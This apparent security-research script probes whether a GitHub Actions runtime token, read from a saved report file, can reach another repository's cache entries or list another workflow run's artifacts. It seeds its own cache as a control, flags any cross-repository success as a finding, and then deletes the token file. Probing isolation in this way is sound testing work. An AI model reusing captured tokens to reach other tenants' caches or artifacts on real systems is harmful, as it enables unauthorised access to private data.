#!/usr/bin/env bash
# T1 oracle FINAL: cache-service oracle with action-context token.
# own  = cross-a-$GITHUB_RUN_ID seeded here (control)
# cross= cross-b-1 seeded by private repo escape-lab-cross
set -u
TOK=$(cat reports/runtime-token.txt 2>/dev/null || true)
if [ -z "$TOK" ]; then
  echo "no runtime token in action context -> isolation confirmed"
  exit 0
fi
CACHE_URL=$(python3 -c "import json;print(json.load(open('reports/action-env.json')).get('ACTIONS_CACHE_URL',''))" 2>/dev/null)
RESULTS_URL=$(python3 -c "import json;print(json.load(open('reports/action-env.json')).get('ACTIONS_RESULTS_URL',''))" 2>/dev/null)
echo "cache base host: $(echo "$CACHE_URL" | sed -E 's#(https://[^/]+/).*#\1#')"
VER='deadbeef00000000000000000000000000000000000000000000000000000000'
KEY_A="cross-a-${GITHUB_RUN_ID}"
KEY_B='cross-b-1'

code() { curl -sS -m 20 -o /tmp/o.out -w "%{http_code}" -H "Authorization: Bearer $TOK" "$@" 2>/dev/null || echo 000; }

echo "== [own control] seed + get"
BODY="{\"key\":\"$KEY_A\",\"version\":\"$VER\",\"size\":14}"
C=$(code -X POST -H 'Content-Type: application/json' -d "$BODY" "${CACHE_URL}_apis/artifactcache/caches")
echo "own reserve: $C"
UP=$(python3 -c "import json;print(json.load(open('/tmp/o.out')).get('signedUploadUrl',''))" 2>/dev/null)
CID=$(python3 -c "import json;print(json.load(open('/tmp/o.out')).get('cacheId',''))" 2>/dev/null)
if [ -n "$UP" ]; then
  printf 'own-seed-data-14' > /tmp/blob.bin
  echo "own upload: $(curl -sS -m 20 -o /dev/null -w '%{http_code}' -X PUT -H 'x-ms-blob-type: BlockBlob' --upload-file /tmp/blob.bin "$UP")"
  echo "own commit: $(curl -sS -m 20 -o /dev/null -w '%{http_code}' -X PATCH -H 'Content-Type: application/json' -d '{"size":14}' "${CACHE_URL}_apis/artifactcache/caches/$CID")"
  sleep 3
  C=$(code "${CACHE_URL}_apis/artifactcache/cache?keys=$KEY_A&version=$VER")
  echo "GET own cache: $C"
  head -c 200 /tmp/o.out; echo
fi

echo "== [T1-cross] own token GET cross-repo cache"
C=$(code "${CACHE_URL}_apis/artifactcache/cache?keys=$KEY_B&version=$VER")
echo "GET cross cache key=$KEY_B: $C   <-- 404=isolated / 200=HIGH FINDING"
head -c 250 /tmp/o.out; echo

echo "== [T1-cross] own token vs cross-repo TWIRP artifacts (results host)"
if [ -n "$RESULTS_URL" ]; then
  for RID in "$GITHUB_RUN_ID" "${B_RUN_ID:-0}"; do
    tag=$([ "$RID" = "$GITHUB_RUN_ID" ] && echo own || echo cross)
    C=$(code -X POST -H 'Content-Type: application/json' \
        -d "{\"workflow_run_id\":$RID}" \
        "${RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts" 2>/dev/null || echo 000)
    echo "TWIRP ListArtifacts run=$RID ($tag): $C"
    head -c 200 /tmp/o.out; echo
  done
fi
rm -f reports/runtime-token.txt
echo "ORACLE FINAL DONE (token file removed)"
